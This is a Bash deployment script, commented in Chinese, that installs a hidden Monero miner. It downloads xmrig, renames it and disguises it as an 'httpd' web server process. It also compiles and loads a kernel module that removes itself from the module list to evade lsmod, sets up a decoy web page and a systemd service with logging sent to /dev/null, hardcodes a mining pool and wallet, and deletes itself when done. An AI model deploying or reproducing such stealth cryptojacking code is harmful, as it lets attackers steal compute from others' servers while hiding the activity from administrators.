#!/bin/bash

# 隐藏进程及其特征的一键部署脚本

# 确保脚本以 root 权限运行
if [ "$(id -u)" != "0" ]; then
   echo "此脚本需要 root 权限运行" 1>&2
   exit 1
fi

# 检查依赖
for cmd in curl tar gcc make systemctl; do
    if ! command -v "$cmd" &> /dev/null; then
        echo "错误：$cmd 未安装，请先安装" 1>&2
        exit 1
    fi
done

# 用户输入矿池 URL 和钱包地址
pool_url="pool.getmonero.us:3333"
wallet_address="47fHeymBVA9iDwR6oauB3a3y6PvmTqq31Hvu62Jk9yvcfTX2LEuRatPVaGNJim7KY2Beo3U7H2smtbekdCiCeev2GpaWyHb"
read -p "请输入服务器密码 (默认: x): " pool_pass
pool_pass=${pool_pass:-x}

# 创建目录
mkdir -p /opt/utils /etc/systemd/system/conf.d /opt/kernel_module || { echo "创建目录失败" 1>&2; exit 1; }

# 下载并安装 xmrig
curl -L https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz | tar -xz -C /opt/utils || { echo "下载或解压失败" 1>&2; exit 1; }
mv /opt/utils/xmrig-6.22.2/xmrig /opt/utils/httpd || { echo "移动文件失败" 1>&2; exit 1; }
chmod +x /opt/utils/httpd
rm -rf /opt/utils/xmrig-6.22.2

# 创建 wrapper 以伪装进程名
cat > /opt/utils/wrapper.c <<EOF
#include <sys/prctl.h>
#include <unistd.h>
int main(int argc, char *argv[]) {
    prctl(PR_SET_NAME, "httpd", 0, 0, 0); // 伪装成 httpd 进程
    execv("/opt/utils/httpd", argv);
    return 0;
}
EOF
gcc -o /opt/utils/wrapper /opt/utils/wrapper.c || { echo "编译 wrapper 失败" 1>&2; exit 1; }
rm /opt/utils/wrapper.c

# 生成配置文件
cat > /etc/systemd/system/conf.d/httpd.conf <<EOF
{
    "pools": [
        {
            "url": "$pool_url",
            "user": "$wallet_address",
            "pass": "$pool_pass",
            "algo": "rx/0"
        }
    ],
    "print-time": 0,
    "verbose": false,
    "donate-level": 0
}
EOF

# 创建内核模块源代码
cat > /opt/kernel_module/sys_helper.c <<EOF
#include <linux/module.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/sched.h>
#include <linux/syscalls.h>

// 伪装 CPU 使用率（示例，实际需修改内核统计逻辑）
static long fake_cpu_usage(void) {
    return 0; // 返回伪造的低 CPU 使用率
}

// 伪装内存使用率（示例，实际需修改内核统计逻辑）
static long fake_mem_usage(void) {
    return 0; // 返回伪造的低内存使用率
}

static int __init sys_helper_init(void) {
    // 隐藏模块自身，避免被 lsmod 检测
    list_del_init(&THIS_MODULE->list);
    return 0;
}

static void __exit sys_helper_exit(void) {
}

module_init(sys_helper_init);
module_exit(sys_helper_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("System Helper Module");
EOF

# 创建 Makefile
cat > /opt/kernel_module/Makefile <<EOF
obj-m += sys_helper.o

all:
    make -C /lib/modules/\$(shell uname -r)/build M=\$(PWD) modules

clean:
    make -C /lib/modules/\$(shell uname -r)/build M=\$(PWD) clean
EOF

# 编译内核模块
cd /opt/kernel_module
make || { echo "内核模块编译失败" 1>&2; exit 1; }

# 加载内核模块
insmod sys_helper.ko || { echo "加载内核模块失败" 1>&2; exit 1; }
cd -

# 检查 httpd 用户和组是否存在
if ! id "httpd" &>/dev/null; then
    if ! getent group "httpd" &>/dev/null; then
        groupadd -r httpd || { echo "创建组 httpd 失败" 1>&2; exit 1; }
    fi
    useradd -r -s /bin/false -g httpd httpd || { echo "创建用户 httpd 失败" 1>&2; exit 1; }
else
    echo "用户 httpd 已存在，跳过创建步骤"
fi

# 设置web 服务器
echo "设置web 服务器..."
mkdir -p /var/www || { echo "创建 web 目录失败" 1>&2; exit 1; }
cat > /var/www/index.html <<EOF
<!DOCTYPE html>
<html>
<head><title>Welcome</title></head>
<body>Welcome to our web server.</body>
</html>
EOF

# 创建 systemd 服务文件
cat > /etc/systemd/system/httpd.service <<EOF
[Unit]
Description=HTTP Server
After=network.target

[Service]
User=httpd
Group=httpd
ExecStart=/opt/utils/wrapper --config=/etc/systemd/system/conf.d/httpd.conf --no-color --log-file=/dev/null --threads=8 #Web Server Service！
Restart=always
CPUQuota=90%

[Install]
WantedBy=multi-user.target
EOF

# 启用并启动服务
systemctl daemon-reload
systemctl enable httpd.service
systemctl start httpd.service || { echo "服务启动失败" 1>&2; exit 1; }

# 删除脚本自身
rm -- "$0"
echo "部署完成！"
